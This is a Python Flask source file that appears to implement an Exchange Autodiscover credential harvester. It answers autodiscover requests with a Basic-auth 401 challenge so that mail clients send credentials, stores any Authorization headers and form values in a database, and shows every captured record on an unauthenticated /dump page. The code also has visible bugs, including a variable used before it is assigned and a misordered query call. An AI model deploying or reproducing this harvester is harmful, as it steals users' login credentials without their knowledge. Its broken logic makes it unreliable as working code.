from flask import render_template
from flask import request

import time
import flask
import logging
import sys
from flask import Flask
#from flask_sslify import SSLify

import os
import requests

from flask import send_from_directory
from flask import Response

import time
from werkzeug.exceptions import Unauthorized

from flask_sqlalchemy import SQLAlchemy
from sqlalchemy import Table, Column, Float, Integer, String, DateTime, MetaData, ForeignKey, func

app = Flask(__name__,static_url_path='/static')
#sslify = SSLify(app)
app.logger.addHandler(logging.StreamHandler(sys.stdout))
app.logger.setLevel(logging.ERROR)

try:
  app.config['SQLALCHEMY_DATABASE_URI'] = os.environ['DATABASE_URL2']
except:
  app.config['SQLALCHEMY_DATABASE_URI'] = "sqlite:///:memory:"
db = SQLAlchemy(app)

class Interesting(db.Model):
  id = db.Column(db.Integer, primary_key=True)
  domain = db.Column(db.String(80))
  headers = db.Column(db.String(8000))
  values = db.Column(db.String(8000))
  ctime = db.Column(DateTime, default=func.now())

@app.before_first_request
def setup():
  print("[+] running setup")
  try:
    db.create_all()
    print("[+] created db")
  except:
    print("[+] db already exists")

@app.route('/autodiscover/autodiscover.xml', methods=['GET', 'POST'])
def autodiscover():
    print(request.headers)
    print(request.values)

    if "Authorization" in request.headers or len(interesting.values)>0:
      print("[+++] ADDING NEW REQUEST")
      interesting = Interesting()
      interesting.domain = request.headers.get("Host")
      interesting.headers = str(request.headers)
      interesting.values = str(request.values)
      db.session.add(interesting)
      db.session.commit() 
#    return send_from_directory(os.path.join(app.root_path, 'static'),'autodiscover.xml')
    return Response('<UNAUTHORIZED>', 401, {'WWW-Authenticate':'Basic realm="Login Required"'})


@app.route('/favicon.ico')
def favicon():
    return send_from_directory(os.path.join(app.root_path, 'static'),
                          'favicon.ico',mimetype='image/vnd.microsoft.icon')

@app.route('/', methods=("GET", "POST", "OPTIONS"))
def index():
  return render_template('index.html')

@app.route('/dump')
def dump():
  msg="<pre>\n"
  for thing in Interesting.query.all().order_by(Interesting.ctime.desc()):
    print("[+++] OMG STUFF '"+str(thing.domain)+"'")
    msg+=thing.domain+"\n"
    msg+=thing.headers+"\n"
    msg+=thing.values+"\n\n"

  msg+="</pre>"
  return msg
